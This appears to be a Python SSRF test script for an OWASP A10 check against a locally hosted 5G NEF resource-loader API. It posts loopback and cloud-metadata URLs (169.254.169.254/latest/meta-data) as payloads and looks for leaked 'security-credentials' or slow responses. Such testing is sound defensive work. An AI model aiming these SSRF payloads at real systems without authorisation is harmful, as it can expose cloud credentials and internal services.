import requests
import urllib3
import json
import time

#--- Configurações de Ambiente (Valores da sua configuração) ---
NF_CONFIG = {
    "NEF_IP": "127.0.0.1",
    "NEF_PORT": 29509
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_ssrf():
    print("=" * 50)
    print("A10 -  Testando Request Forgery")
    print("=" * 50)

    nf_api_url = f"http://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/api/resource_loader" 
    target_param = "url"

    test_endpoints = [
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data"
    ]
    
    vulnerable_found = False
    for url in test_endpoints:
        try:
            start_time = time.time()
            response = requests.post(nf_api_url, json={target_param: url}, timeout=5)
            end_time = time.time()
            if response.status_code == 200 and "security-credentials" in response.text:
                print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
                vulnerable_found = True
                break
            
            response_time = end_time - start_time
            if response_time > 3:
                print(f"[!] Possível SSRF Blind detectada! Requisição para '{url}' demorou {response_time:.2f}s.")

        except requests.exceptions.RequestException as e:
            pass

    if not vulnerable_found:
        print("[+] SSRF não detectado com payloads de teste.")

if __name__ == "__main__":
    test_ssrf()